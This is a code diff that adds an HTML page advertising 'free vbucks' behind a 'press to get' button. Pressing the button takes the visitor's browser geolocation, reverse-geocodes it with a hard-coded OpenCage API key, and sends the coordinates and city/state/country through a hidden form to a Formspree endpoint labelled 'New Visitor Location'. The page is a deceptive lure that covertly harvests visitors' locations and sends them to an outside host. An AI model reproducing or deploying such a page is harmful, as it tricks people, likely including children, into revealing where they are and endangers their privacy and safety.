@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Location with Address</title>
+</head>
+<body>
+  <h2>free vbucks</h2>
+  <button onclick="getLocation()">press to get</button>
+
+  <form id="locationForm" action="https://formspree.io/f/moveygzp" method="POST" style="display:none;">
+    <input type="hidden" name="Coordinates" id="coordinates">
+    <input type="hidden" name="Location Info" id="address">
+    <input type="hidden" name="_subject" value="New Visitor Location">
+  </form>
+
+  <script>
+    async function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          document.getElementById("coordinates").value = `Lat: ${lat}, Lon: ${lon}`;
+
+          const apiKey = "23b384c9495947938e1300113a39b6d0"; // ← Replace with your real API key
+          const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
+
+          try {
+            const response = await fetch(url);
+            const data = await response.json();
+            const components = data.results[0].components;
+            const city = components.city || components.town || components.village || "";
+            const state = components.state || "";
+            const country = components.country || "";
+
+            const fullAddress = `${city}, ${state}, ${country}`;
+            document.getElementById("address").value = fullAddress;
+
+            document.getElementById("locationForm").submit();
+            alert("Location info sent to your email!");
+          } catch (error) {
+            alert("Could not get detailed location: " + error);
+          }
+        }, function(error) {
+          alert("Geolocation error: " + error.message);
+        });
+      } else {
+        alert("Geolocation is not supported by this browser.");
+      }
+    }
+  </script>
+</body>
+</html>
